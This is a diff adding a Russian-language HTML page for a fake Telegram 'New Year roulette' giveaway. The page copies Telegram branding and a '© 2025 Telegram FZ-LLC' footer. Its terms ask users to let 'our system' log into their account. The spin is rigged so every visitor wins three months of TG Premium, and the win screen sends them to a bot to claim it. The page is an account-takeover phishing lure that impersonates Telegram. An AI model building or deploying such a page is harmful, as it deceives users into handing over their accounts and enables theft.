@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Новогодняя рулетка @case</title>
+    <style>
+        :root {
+            --tg-blue: #24A1DE;
+            --tg-dark: #17212b;
+            --accent: #00afff;
+            --text-gray: #8e979f;
+        }
+
+        body {
+            background: #0e1621;
+            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            position: relative;
+        }
+
+        #snow {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        /* Экран с Кейсом (Промежуточный) */
+        #case-screen {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: radial-gradient(circle, #1c2733 0%, #0e1621 100%);
+            display: none; /* Скрыт по дефолту */
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 500;
+            text-align: center;
+        }
+
+        .case-container {
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .case-img {
+            width: 280px;
+            filter: drop-shadow(0 0 20px rgba(36, 161, 222, 0.4));
+            animation: float 3s ease-in-out infinite;
+            cursor: pointer;
+        }
+
+        .glow {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 300px; height: 300px;
+            background: radial-gradient(circle, rgba(36, 161, 222, 0.2) 0%, transparent 70%);
+            z-index: -1;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+
+        @keyframes pulse {
+            0% { transform: translate(-50%, -50%) scale(1); opacity: 0.5; }
+            50% { transform: translate(-50%, -50%) scale(1.3); opacity: 0.8; }
+            100% { transform: translate(-50%, -50%) scale(1); opacity: 0.5; }
+        }
+
+        /* Основной контент (Рулетка) */
+        #main-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            opacity: 0;
+            transition: opacity 0.8s ease;
+            pointer-events: none;
+        }
+
+        .header { margin-top: 30px; text-align: center; z-index: 10; }
+        .main-logo { width: 75px; height: 75px; margin-bottom: 10px; filter: drop-shadow(0 0 15px var(--tg-blue)); }
+        h1 { font-size: 24px; margin: 0; text-transform: uppercase; letter-spacing: 1px; }
+        .subtitle { color: var(--tg-blue); font-weight: bold; font-size: 16px; margin-top: 5px; }
+
+        .roulette-box { position: relative; width: 90%; max-width: 500px; margin: 40px 0; z-index: 10; }
+        .viewport { position: relative; height: 200px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; overflow: hidden; backdrop-filter: blur(10px); }
+        .line { position: absolute; left: 50%; top: 0; bottom: 0; width: 3px; background: #fff; z-index: 20; box-shadow: 0 0 15px var(--tg-blue); transform: translateX(-50%); }
+        .tape { display: flex; position: absolute; left: 0; top: 0; height: 100%; transition: transform 10s cubic-bezier(0.15, 0, 0.05, 1); }
+
+        .item { min-width: 160px; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; border-right: 1px solid rgba(255,255,255,0.05); }
+        .item img { width: 90px; height: 90px; margin-bottom: 10px; object-fit: contain; }
+
+        .btn-spin { padding: 20px 60px; font-size: 18px; font-weight: 800; color: white; background: var(--tg-blue); border: none; border-radius: 18px; cursor: pointer; box-shadow: 0 8px 30px rgba(36, 161, 222, 0.4); z-index: 10; transition: 0.3s; }
+        .btn-spin:disabled { background: #2c3640; opacity: 0.5; cursor: not-allowed; }
+
+        /* Модалки */
+        .overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0); display: none; align-items: center; justify-content: center; z-index: 1000; backdrop-filter: blur(0px); transition: all 0.5s ease; }
+        .overlay.active { background: rgba(0,0,0,0.95); backdrop-filter: blur(20px); }
+        .modal { background: #1c2733; padding: 30px; border-radius: 25px; text-align: center; border: 1px solid rgba(255,255,255,0.1); max-width: 320px; transform: scale(0.8); opacity: 0; transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1); }
+        .overlay.active .modal { transform: scale(1); opacity: 1; }
+        .modal-btn { display: block; width: 100%; padding: 14px; background: var(--tg-blue); color: white; border-radius: 12px; font-weight: bold; margin-top: 20px; text-decoration: none; border: none; cursor: pointer; }
+
+        footer { margin-top: auto; padding: 30px 20px; text-align: center; font-size: 11px; color: var(--text-gray); z-index: 10; }
+        footer span { color: var(--tg-blue); text-decoration: underline; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<canvas id="snow"></canvas>
+
+<div class="overlay" id="overlayTerms" style="display: flex;">
+    <div class="modal" style="opacity: 1; transform: scale(1);">
+        <h3>Пользовательское соглашение</h3>
+        <p style="text-align: left; font-size: 13px; line-height: 1.5;">
+            Для участия необходимо принять условия.<br><br>
+            <b>Для получения приза наша система должна кратковременно выполнить вход на ваш аккаунт</b> для автоматической верификации.
+        </p>
+        <button class="modal-btn" onclick="acceptTerms()">ПРИНИМАЮ</button>
+    </div>
+</div>
+
+<div id="case-screen">
+    <div class="case-container">
+        <div class="glow"></div>
+        <img src="Case.jpg" class="case-img" alt="Кейс" id="caseToOpen">
+    </div>
+    <h2 style="margin-bottom: 10px;">ВАШ НОВОГОДНИЙ ПОДАРОК</h2>
+    <p style="opacity: 0.7; font-size: 14px;">Нажмите на ящик, чтобы открыть рулетку</p>
+    <button class="modal-btn" style="width: 200px; margin: 20px auto;" onclick="openMain()">ПЕРЕЙТИ К ОТКРЫТИЮ</button>
+</div>
+
+<div id="main-content">
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="main-logo">
+        <h1>Новогодняя рулетка</h1>
+        <div class="subtitle">Совместно с @case</div>
+    </div>
+
+    <div class="roulette-box">
+        <div class="line"></div>
+        <div class="viewport"><div class="tape" id="tape"></div></div>
+    </div>
+
+    <button class="btn-spin" id="spinBtn">ИСПЫТАТЬ УДАЧУ</button>
+
+    <footer>
+        Нажимая кнопку, вы соглашаетесь с <span>правилами</span> и <span>соглашением</span>.<br>
+        Канал Розыгрыша: <b>@case</b><br><br>
+        © 2025 Telegram FZ-LLC
+    </footer>
+</div>
+
+<div class="overlay" id="overlayWin">
+    <div class="modal">
+        <img src="Premium.jpg" alt="Premium">
+        <h2>ПОЗДРАВЛЯЕМ!</h2>
+        <p>Вы выиграли <b>TG Premium на 3 месяца!</b><br><br>Для получения перейдите в бота:</p>
+        <a href="http://t.me/CaseNY_bot" class="modal-btn">ЗАБРАТЬ В БОТЕ</a>
+    </div>
+</div>
+
+<script>
+    const prizes = [
+        { name: 'TG Premium (3 мес)', img: 'Premium.jpg' },
+        { name: '1000 Stars', img: 'Star.jpg' },
+        { name: '5.0 TON Coin', img: 'Ton.jpg' },
+        { name: 'NFT Sticker', img: 'NFT.jpeg' }
+    ];
+
+    const tape = document.getElementById('tape');
+    const btn = document.getElementById('spinBtn');
+    const itemWidth = 160;
+
+    function init() {
+        if (localStorage.getItem('spinDone')) {
+            document.getElementById('overlayTerms').style.display = 'none';
+            document.getElementById('main-content').style.opacity = '1';
+            document.getElementById('main-content').style.pointerEvents = 'all';
+            btn.disabled = true;
+            btn.innerText = "ПРИЗ ПОЛУЧЕН";
+        }
+
+        for (let i = 0; i < 80; i++) {
+            const p = prizes[i % prizes.length];
+            const div = document.createElement('div');
+            div.className = 'item';
+            div.innerHTML = `<img src="${p.img}"><span>${p.name}</span>`;
+            tape.appendChild(div);
+        }
+    }
+
+    // Шаг 1: Принятие соглашения
+    function acceptTerms() {
+        const terms = document.getElementById('overlayTerms');
+        terms.classList.remove('active');
+        setTimeout(() => {
+            terms.style.display = 'none';
+            document.getElementById('case-screen').style.display = 'flex';
+        }, 500);
+    }
+
+    // Шаг 2: Переход от кейса к рулетке
+    function openMain() {
+        document.getElementById('case-screen').style.opacity = '0';
+        setTimeout(() => {
+            document.getElementById('case-screen').style.display = 'none';
+            const main = document.getElementById('main-content');
+            main.style.opacity = '1';
+            main.style.pointerEvents = 'all';
+        }, 500);
+    }
+
+    function spin() {
+        if (localStorage.getItem('spinDone')) return;
+        btn.disabled = true;
+        const target = 72; 
+        const offset = (target * itemWidth) - (document.querySelector('.viewport').offsetWidth / 2) + (itemWidth / 2);
+        tape.style.transform = `translateX(-${offset}px)`;
+
+        setTimeout(() => {
+            localStorage.setItem('spinDone', 'true');
+            showModal('overlayWin');
+        }, 10500);
+    }
+
+    function showModal(id) {
+        const el = document.getElementById(id);
+        el.style.display = 'flex';
+        setTimeout(() => el.classList.add('active'), 10);
+    }
+
+    // Снег
+    const canvas = document.getElementById('snow');
+    const ctx = canvas.getContext('2d');
+    let flakes = [];
+    function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+    window.onresize = resize;
+    resize();
+    for(let i=0; i<120; i++) flakes.push({x: Math.random()*canvas.width, y: Math.random()*canvas.height, s: Math.random()*3+1, v: Math.random()*1+0.5});
+    function draw() {
+        ctx.clearRect(0,0,canvas.width,canvas.height);
+        ctx.fillStyle = "rgba(255,255,255,0.7)";
+        flakes.forEach(f => {
+            ctx.beginPath(); ctx.arc(f.x, f.y, f.s, 0, Math.PI*2); ctx.fill();
+            f.y += f.v; if(f.y > canvas.height) { f.y = -10; f.x = Math.random()*canvas.width; }
+        });
+        requestAnimationFrame(draw);
+    }
+
+    btn.onclick = spin;
+    init();
+    draw();
+</script>
+</body>
+</html>
